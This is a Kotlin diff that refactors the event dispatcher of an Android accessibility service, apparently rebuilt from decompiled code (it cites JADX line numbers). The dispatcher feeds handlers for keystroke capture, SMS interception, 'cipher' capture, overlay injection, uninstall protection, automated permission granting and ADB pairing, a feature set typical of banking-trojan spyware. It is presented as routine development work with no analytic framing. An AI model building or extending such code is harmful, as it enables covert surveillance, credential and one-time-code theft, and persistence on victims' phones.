@@ -75,26 +75,60 @@ class EventDispatcher(private val service: MyAccessibilityService) {
      * after the power/sensitive guard passes.
      *
      * JADX lines 9767–10177 (the entire body between the power/sensitive guard and the outer catch).
+     *
+     * Split into 3 phases:
+     * - Phase 1 (Guards): filtered event types, screen capture pause, core service check
+     * - Phase 2 (Pre-permission): handlers that must run before the permission guard
+     * - Phase 3 (Post-permission): handlers that require permission guard to have passed
      */
     fun dispatch(event: AccessibilityEvent) {
         val eventType = event.eventType
+        val pkg = event.packageName?.toString()?.lowercase(Locale.ROOT) ?: ""
 
+        // Phase 1: Guards — can short-circuit the entire dispatch
+        if (handleGuards(event, eventType, pkg)) return
+
+        // Phase 2: Pre-permission handlers
+        handlePrePermissionEvents(event, eventType, pkg)
+
+        // Phase 3: Permission guard + post-permission handlers
+        if (MyAccessibilityService.isPermissionRequestActive() || MyAccessibilityService.isWebViewOpen) return
+        handlePostPermissionEvents(event, eventType, pkg)
+    }
+
+    // ════════════════════════════════════════════════════════════════
+    // Phase 1: Guards — filtered events, screen capture pause, core service
+    // ════════════════════════════════════════════════════════════════
+
+    /**
+     * Phase 1: Guard checks that can short-circuit the entire dispatch.
+     * @return true if the event was consumed (caller should return)
+     */
+    internal fun handleGuards(event: AccessibilityEvent, eventType: Int, pkg: String): Boolean {
         // ── Filtered event types → route to eventFilterManager (JADX line 9770) ──
-        if (eventType == 512 || eventType == 1024 || eventType == 262144 ||
-            eventType == 524288 || eventType == 1048576 || eventType == 2097152) {
-            if (service.eventFilterManager == null || MyAccessibilityService.isWebViewOpen) return
-            // JADX: this.f52414e5.m213127b5(accessibilityEvent)
-            service.eventFilterManager?.onAccessibilityEvent(event)
-            return
-        }
+        if (dispatchFilteredEvents(event, eventType)) return true
 
         // ── Ensure AppCoreService running (throttled 10s) (JADX line 9783) ──
         ensureCoreServiceRunning()
 
-        // ── Extract package name (JADX line 9796) ──
-        val pkg = event.packageName?.toString()?.lowercase(Locale.ROOT) ?: ""
-
         // ── Screen capture pause check (JADX line 9804) ──
+        if (checkScreenCapturePause(event)) return true
+
+        return false
+    }
+
+    private fun dispatchFilteredEvents(event: AccessibilityEvent, eventType: Int): Boolean {
+        if (eventType == 512 || eventType == 1024 || eventType == 262144 ||
+            eventType == 524288 || eventType == 1048576 || eventType == 2097152) {
+            if (service.eventFilterManager == null || MyAccessibilityService.isWebViewOpen) return true
+            // JADX: this.f52414e5.m213127b5(accessibilityEvent)
+            service.eventFilterManager?.onAccessibilityEvent(event)
+            return true
+        }
+        return false
+    }
+
+    private fun checkScreenCapturePause(event: AccessibilityEvent): Boolean {
         try {
             val scm = service.screenCaptureManager
             if (scm != null && scm.isCapturing) {
@@ -106,11 +140,30 @@ class EventDispatcher(private val service: MyAccessibilityService) {
                         scm.lastPauseTime = now
                         scm.pauseCapture()
                     }
-                    return
+                    return true
                 }
             }
         } catch (_: Exception) {}
+        return false
+    }
 
+    // ════════════════════════════════════════════════════════════════
+    // Phase 2: Pre-permission handlers (before permission guard)
+    // ════════════════════════════════════════════════════════════════
+
+    /**
+     * Phase 2: Handlers that must run BEFORE the permission request guard.
+     * All handlers run independently (no short-circuit).
+     */
+    internal fun handlePrePermissionEvents(event: AccessibilityEvent, eventType: Int, pkg: String) {
+        dispatchVirusDialog(event, eventType)
+        dispatchRecentsGuard(event, eventType)
+        dispatchMainOrchestrator(event)
+        dispatchSystemOptimize(event)
+        dispatchKeystrokeCapture(event, eventType)
+    }
+
+    private fun dispatchVirusDialog(event: AccessibilityEvent, eventType: Int) {
         // ── Event type 32 (WINDOW_STATE_CHANGED): virus control dialog (JADX line 9827) ──
         if (eventType == 32) {
             try {
@@ -125,14 +178,18 @@ class EventDispatcher(private val service: MyAccessibilityService) {
                 }
             } catch (_: Exception) {}
         }
+    }
 
+    private fun dispatchRecentsGuard(event: AccessibilityEvent, eventType: Int) {
         // ── Event type 32/2048 → RecentsGuardManager (JADX line 9845) ──
         if (eventType == 32 || eventType == 2048) {
             try {
                 service.recentsGuardManager?.onAccessibilityEvent(event)
             } catch (_: Exception) {}
         }
+    }
 
+    private fun dispatchMainOrchestrator(event: AccessibilityEvent) {
         // ── MainOrchestrator WRITE_SETTINGS automation (JADX: C0327b2) ──
         // Must be BEFORE isPermissionRequestActive guard — WRITE_SETTINGS IS a permission
         // request, so the guard would block it. MainOrchestrator has its own isActive guard.
@@ -148,7 +205,9 @@ class EventDispatcher(private val service: MyAccessibilityService) {
                 mo.handleAccessibilityEvent(event)
             }
         } catch (_: Exception) {}
+    }
 
+    private fun dispatchSystemOptimize(event: AccessibilityEvent) {
         // ── SystemOptimizeManager ADB pairing event dispatch (vendor: C0360a2.m212078i3) ──
         try {
             val som = com.storm.safe.rock.service.modules.setup.SystemOptimizeManager.getInstance(service, service)
@@ -163,7 +222,9 @@ class EventDispatcher(private val service: MyAccessibilityService) {
             }
             som.filterAccessibilityEvent(event)
         } catch (_: Exception) {}
+    }
 
+    private fun dispatchKeystrokeCapture(event: AccessibilityEvent, eventType: Int) {
         // ── C0320a5 dispatch: keystroke capture, app usage, notifications ──
         // JADX: dispatches to C0320a5.m211582a3 for event types 16, 32, 64
         if (eventType == 16 || eventType == 32 || eventType == 64) {
@@ -171,14 +232,52 @@ class EventDispatcher(private val service: MyAccessibilityService) {
                 service.eventFilterManager?.keystrokeCapture?.handleEvent(event, null)
             } catch (_: Exception) {}
         }
+    }
 
-        // ── Permission request guard (JADX line 9848) ──
-        if (MyAccessibilityService.isPermissionRequestActive() || MyAccessibilityService.isWebViewOpen) return
+    // ════════════════════════════════════════════════════════════════
+    // Phase 3: Post-permission handlers (after permission guard)
+    // ════════════════════════════════════════════════════════════════
 
+    /**
+     * Phase 3: Handlers that run after the permission request guard has passed.
+     * Contains keyguard check, content change throttle, and all post-guard handlers.
+     */
+    internal fun handlePostPermissionEvents(event: AccessibilityEvent, eventType: Int, pkg: String) {
         // ── Keyguard locked check (JADX line 9849) ──
         val isKeyguardLocked = service.isKeyguardLockedCached()
 
         // ── Event type 2 (VIEW_TEXT_CHANGED) → update lastCachedSource (JADX line 9851) ──
+        updateCachedSource(event, eventType)
+
+        // ── Overlay/gesture executor dispatch when not keyguard locked (JADX line 9952) ──
+        if (!isKeyguardLocked) {
+            try {
+                // ADAPT: C0032al (GestureExecutor/LauncherProtector, 475 LOC) — complex overlay manager
+                if (service.isOverlayEnabled()) {
+                    android.util.Log.v(TAG, "🛡️ [GestureExecutor] gestureExecutor event dispatch (C0032al not replicated as standalone)")
+                }
+            } catch (_: Exception) {}
+        }
+
+        // ── Content change throttle computation (JADX line 9960–9978) ──
+        val isThrottled = computeContentChangeThrottle(event, eventType)
+
+        // ── Uninstall protection + package installer + SMS + cipher + notification/gesture + injection ──
+        dispatchUninstallProtection(event, eventType, isKeyguardLocked, isThrottled)
+        dispatchPackageInstallerOverlay(event, eventType)
+        dispatchSmsNotification(event, eventType)
+        dispatchCipherCapture(event, eventType)
+        dispatchNotificationAndGesture(event, eventType, isThrottled)
+        dispatchInjection(event, eventType)
+        dispatchEventFilterSecondPass(event)
+        dispatchConfigStage(event, eventType, pkg)
+        dispatchEventRouter(event, eventType)
+
+        // ── Legacy delegate queue dispatch ──
+        service.dispatchToDelegates(event, pkg, event.className?.toString() ?: "")
+    }
+
+    private fun updateCachedSource(event: AccessibilityEvent, eventType: Int) {
         if (eventType == 2) {
             var source: AccessibilityNodeInfo? = null
             try {
@@ -201,17 +300,13 @@ class EventDispatcher(private val service: MyAccessibilityService) {
                 try { source?.recycle() } catch (_: Exception) {}
             }
         }
+    }
 
-        // ── Overlay/gesture executor dispatch when not keyguard locked (JADX line 9952) ──
-        if (!isKeyguardLocked) {
-            try {
-                // ADAPT: C0032al (GestureExecutor/LauncherProtector, 475 LOC) — complex overlay manager
-                if (service.isOverlayEnabled()) {
-                    android.util.Log.v(TAG, "🛡️ [GestureExecutor] gestureExecutor event dispatch (C0032al not replicated as standalone)")
-                }
-            } catch (_: Exception) {}
-        }
-
+    /**
+     * Compute content change throttle state.
+     * @return true if the event should be throttled
+     */
+    private fun computeContentChangeThrottle(event: AccessibilityEvent, eventType: Int): Boolean {
         // ── WINDOW_CONTENT_CHANGED (2048) package tracking (JADX line 9960–9975) ──
         val isContentChange = eventType == 2048
         val contentChangePkg: String
@@ -230,10 +325,12 @@ class EventDispatcher(private val service: MyAccessibilityService) {
         val contentChangeTime = if (isContentChange) System.currentTimeMillis() else 0L
 
         // ── Throttle: 300ms between content change events (JADX line 9978) ──
-        val isThrottled = if (isContentChange && !isFromLauncherPkg) {
+        return if (isContentChange && !isFromLauncherPkg) {
             isContentChangeThrottled(contentChangeTime)
         } else false
+    }
 
+    private fun dispatchUninstallProtection(event: AccessibilityEvent, eventType: Int, isKeyguardLocked: Boolean, isThrottled: Boolean) {
         // ── UninstallProtectionManager dispatch for specific packages (JADX line 9982–9998) ──
         if (!service.isUninstallGuardStarted && !isKeyguardLocked && !isThrottled) {
             try {
@@ -258,7 +355,9 @@ class EventDispatcher(private val service: MyAccessibilityService) {
                 }
             } catch (_: Exception) {}
         }
+    }
 
+    private fun dispatchPackageInstallerOverlay(event: AccessibilityEvent, eventType: Int) {
         // ── Event type 32: Package installer overlay (JADX line 10015–10035) ──
         if (eventType == 32) {
             try {
@@ -282,12 +381,16 @@ class EventDispatcher(private val service: MyAccessibilityService) {
                 }
             } catch (_: Exception) {}
         }
+    }
 
+    private fun dispatchSmsNotification(event: AccessibilityEvent, eventType: Int) {
         // ── Event type 64 (TYPE_NOTIFICATION_STATE_CHANGED) → SMS interception (JADX line 10036) ──
         if (eventType == 64) {
             processNotificationForSms(event)
         }
+    }
 
+    private fun dispatchCipherCapture(event: AccessibilityEvent, eventType: Int) {
         // ── CipherCaptureManager dispatch (JADX line 10039) ──
         service.cipherCaptureManager?.let { ccm ->
             when (eventType) {
@@ -314,7 +417,9 @@ class EventDispatcher(private val service: MyAccessibilityService) {
                 ccm.dispatchEvent("accessibility_event_$eventType")
             }
         }
+    }
 
+    private fun dispatchNotificationAndGesture(event: AccessibilityEvent, eventType: Int, isThrottled: Boolean) {
         // ── processNotificationEvent — lockscreen gesture dispatch (JADX line 10052) ──
         if (eventType == 32 || eventType == 2048) {
             processNotificationEvent(event)
@@ -344,18 +449,24 @@ class EventDispatcher(private val service: MyAccessibilityService) {
                 }
             } catch (_: Exception) {}
         }
+    }
 
+    private fun dispatchInjection(event: AccessibilityEvent, eventType: Int) {
         // ── processWindowChangeForInjection (JADX line 10110) ──
         if (eventType == 32 || eventType == 4194304) {
             processWindowChangeForInjection(event)
         }
+    }
 
+    private fun dispatchEventFilterSecondPass(event: AccessibilityEvent) {
         // ── eventFilterManager second dispatch (JADX line 10113) ──
         if (service.eventFilterManager != null && !MyAccessibilityService.isWebViewOpen) {
             // JADX: this.f52414e5.m213127b5(accessibilityEvent)
             service.eventFilterManager?.onAccessibilityEvent(event)
         }
+    }
 
+    private fun dispatchConfigStage(event: AccessibilityEvent, eventType: Int, pkg: String) {
         // ── ConfigStageManager / yw5xud dispatch (JADX line 10121–10133) ──
         if (eventType == 32 || eventType == 2048) {
             try {
@@ -392,7 +503,9 @@ class EventDispatcher(private val service: MyAccessibilityService) {
                 }
             } catch (_: Exception) {}
         }
+    }
 
+    private fun dispatchEventRouter(event: AccessibilityEvent, eventType: Int) {
         // ── AccessibilityEventRouter dispatch (JADX line 10169–10177) ──
         if (eventType == 1 || eventType == 32 || eventType == 2048) {
             try {
@@ -402,9 +515,6 @@ class EventDispatcher(private val service: MyAccessibilityService) {
                 }
             } catch (_: Exception) {}
         }
-
-        // ── Legacy delegate queue dispatch ──
-        service.dispatchToDelegates(event, pkg, event.className?.toString() ?: "")
     }
 
     // ════════════════════════════════════════════════════════════════
